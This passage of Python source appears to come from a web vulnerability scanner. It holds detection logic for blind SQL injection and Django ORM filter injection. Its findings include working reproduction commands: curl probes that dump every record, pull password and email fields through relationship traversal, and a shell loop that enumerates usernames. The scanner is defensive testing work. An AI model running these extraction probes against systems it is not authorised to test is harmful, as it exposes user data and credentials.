                        f"$ time {build_curl_command(url, method, params, param_name, params.get(param_name, '')).lstrip('$ ')}\n"
                        f"# 2. Send the time-based payload and measure delay:\n"
                        f"$ time {curl.lstrip('$ ')}\n"
                        f"# 3. If the second request takes ~{delay_sec}s longer than baseline,\n"
                        f"#    it confirms time-based blind SQLi ({dbms}).\n"
                        f"# Expected: baseline ~{avg_baseline:.1f}s vs payload ~{elapsed:.1f}s"
                    ),
                )
        return None

    # ------------------------------------------------------------------
    # Strategy 4: Django ORM injection
    # ------------------------------------------------------------------

    def _test_orm_injection(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
        baseline_text: str = "",
    ) -> Optional[Finding]:
        """Detect Django ORM filter injection.

        Django apps using django-filter or queryset.filter(**request.GET) expose
        arbitrary ORM lookups via URL parameters.  When a parameter name contains
        '__' (the Django ORM lookup separator), we probe whether the backend accepts:
          1. Permissive lookups that return ALL records (id__gte=0, pk__gte=0)
          2. Empty-value icontains that returns all (title__icontains=)
          3. Relationship traversal (user__id__gte=0, author__id__gte=0)

        A significantly larger response than baseline confirms the backend passes
        user-controlled keys to filter() without whitelist validation.
        """
        if "__" not in param_name:
            return None

        field_base = param_name.split("__")[0]  # "title" from "title__icontains"
        baseline_len = len(baseline_text)
        baseline_text_lower = baseline_text.lower()

        # Adaptive threshold: pages with heavy static HTML (CSS/JS) have a large
        # baseline that dwarfs small result-set expansions.  Use 10% for large
        # pages (>8 KB) to catch cases where a few extra records add only ~1-2 KB.
        pct = 0.10 if baseline_len > 8000 else 0.20
        expand_threshold = max(300, int(baseline_len * pct))

        # Pre-compile result-count patterns so we can detect numeric increases
        # even when raw byte expansion is small (e.g. Django "Signals Found: N").
        _COUNT_RE = re.compile(
            r'(?:results?|found|signals?|records?|items?|posts?|count)[^\d]{0,20}(\d+)',
            re.IGNORECASE,
        )

        def _baseline_count() -> Optional[int]:
            m = _COUNT_RE.search(baseline_text)
            return int(m.group(1)) if m else None

        def _response_count(text: str) -> Optional[int]:
            m = _COUNT_RE.search(text)
            return int(m.group(1)) if m else None

        def _send_probe(probe_params: Dict) -> Optional[object]:
            return self._send(url, method, probe_params)

        base_count = _baseline_count()

        # --- Probe group 1: permissive lookups that should return ALL records ---
        permissive_probes = [
            # Strip existing filter, replace with id__gte=0 (returns everything)
            ({k: v for k, v in params.items() if k != param_name} | {"id__gte": "0"}, "id__gte=0"),
            ({k: v for k, v in params.items() if k != param_name} | {"pk__gte": "0"}, "pk__gte=0"),
            # Empty icontains → ILIKE '%%' → matches all records
            ({**params, param_name: ""}, f"{param_name}= (empty, matches all)"),
            # Regex wildcard on the same field
            ({k: v for k, v in params.items() if k != param_name} | {f"{field_base}__regex": ".+"}, f"{field_base}__regex=.+"),
        ]

        for probe_params, label in permissive_probes:
            resp = _send_probe(probe_params)
            if resp is None or resp.status_code != 200:
                continue

            expansion = len(resp.text) - baseline_len

            # Accept the probe if EITHER the byte expansion is large enough
            # OR the result count in the response is higher than baseline.
            probe_count = _response_count(resp.text)
            count_increase = (
                probe_count is not None
                and (base_count is None or probe_count > base_count)
                and probe_count > 0
            )

            if expansion >= expand_threshold or count_increase:
                if count_increase:
                    signal = (
                        f"result count {base_count} → {probe_count}"
                        if base_count is not None
                        else f"result count appeared ({probe_count})"
                    )
                else:
                    signal = f"response expanded +{expansion} B ({baseline_len} → {len(resp.text)})"
                logger.debug(
                    "[SQLi/ORM] %s: probe %r triggered (%s)",
                    param_name, label, signal,
                )
                qs = "&".join(f"{k}={v}" for k, v in probe_params.items())
                return Finding(
                    vuln_type="ORM Injection (Django Filter)",
                    url=url,
                    method=method,
                    parameter=param_name,
                    payload=label,
                    evidence=(
                        f"Probe {label!r} triggered: {signal} — "
                        f"backend accepts arbitrary ORM lookups"
                    ),
                    confidence="high",
                    details=(
                        f"Parameter {param_name!r} exposes a Django ORM filter. "
                        f"The backend passes URL parameters directly to queryset.filter() "
                        f"without whitelisting allowed lookup fields.\n"
                        f"Impact:\n"
                        f"  • Enumerate all records: ?id__gte=0\n"
                        f"  • Extract related model data: ?user__password__icontains=a\n"
                        f"  • Bypass search restrictions via lookup-type substitution\n"
                        f"Remediation: define an explicit filter class with a whitelist of "
                        f"allowed fields and lookup types; never pass request.GET directly "
                        f"to filter()."
                    ),
                    reproduction=(
                        f"# 1. Dump all records by bypassing the filter:\n"
                        f"$ curl '{url}?{qs}'\n\n"
                        f"# 2. Extract sensitive fields via relationship traversal:\n"
                        f"$ curl '{url}?user__email__icontains='\n"
                        f"$ curl '{url}?user__password__icontains='\n"
                        f"$ curl '{url}?created_by__username__icontains='\n\n"
                        f"# 3. Enumerate users by initial letter (blind extraction):\n"
                        f"$ for letter in a b c d e; do\n"
                        f"    echo -n \"$letter: \"; curl -s '{url}?user__username__startswith='$letter | wc -c\n"
                        f"  done\n\n"
                        f"# 4. Try RegexFilter for full extraction:\n"
                        f"$ curl '{url}?{field_base}__regex=.*'"
                    ),
                )

        # --- Probe group 2: relationship traversal (blind enumeration) ---
        traversal_probes = [
            ({k: v for k, v in params.items() if k != param_name} | {"user__id__gte": "0"}, "user__id__gte=0"),
            ({k: v for k, v in params.items() if k != param_name} | {"author__id__gte": "0"}, "author__id__gte=0"),
            ({k: v for k, v in params.items() if k != param_name} | {"owner__id__gte": "0"}, "owner__id__gte=0"),
            ({k: v for k, v in params.items() if k != param_name} | {"created_by__id__gte": "0"}, "created_by__id__gte=0"),
        ]

        for probe_params, label in traversal_probes:
            resp = _send_probe(probe_params)
            if resp is None or resp.status_code != 200:
                continue

            expansion = len(resp.text) - baseline_len
            if expansion >= max(200, int(baseline_len * 0.10)):
                qs = "&".join(f"{k}={v}" for k, v in probe_params.items())
                return Finding(
                    vuln_type="ORM Injection (Django Relationship Traversal)",
                    url=url,
                    method=method,
                    parameter=param_name,
                    payload=label,
                    evidence=(
                        f"Relationship traversal probe {label!r} returned {len(resp.text)} bytes "
                        f"(baseline: {baseline_len} bytes, +{expansion} B)"
                    ),
                    confidence="medium",
                    details=(
                        f"Backend accepted cross-model ORM filter {label!r}. "
                        f"An attacker can traverse foreign-key relationships to extract "
                        f"data from related models (users, passwords, tokens, PII). "
                        f"Remediation: whitelist allowed filter fields in the filter class."
                    ),
                    reproduction=(
                        f"# Traverse relationships to extract sensitive data:\n"
                        f"$ curl '{url}?{qs}'\n"
                        f"$ curl '{url}?user__email__icontains='\n"
                        f"$ curl '{url}?user__password__icontains=a'"
                    ),
                )

        return None
